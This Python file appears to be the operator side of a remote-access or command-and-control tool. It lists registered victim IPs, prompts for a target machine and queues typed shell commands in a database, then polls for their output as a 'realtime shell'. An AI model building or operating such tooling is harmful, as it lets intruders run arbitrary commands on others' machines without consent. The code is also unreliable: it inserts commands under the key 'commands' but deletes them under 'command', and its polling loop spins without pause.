from database.database import get_commands_collection, get_results_collection
from utils.clear_terminal import clear_terminal
from utils.print_banner import print_banner
from utils.print_registred_ips import print_registred_ips

def normal_shell():
    print_registred_ips()
    ip = input('Enter the ip of the target machine: ')
    clear_terminal()
    print_banner(type='realtime')
    while True:
        print('# ', end='')
        cmd = input()
        if cmd == 'exit':
            print('exited realtime shell')
            break
        exec_command(cmd, ip)
        

def exec_command(cmd, ip):
    get_commands_collection().insert_one({'commands': cmd, 'ip': ip, 'realtime': True})
    while True:
        result = get_results_collection().find_one({'command': cmd})
        if result:
            print(result['results'])
            get_commands_collection().delete_one({'command': cmd})
            get_results_collection().delete_one({'command': cmd})
            break
        else:
            continue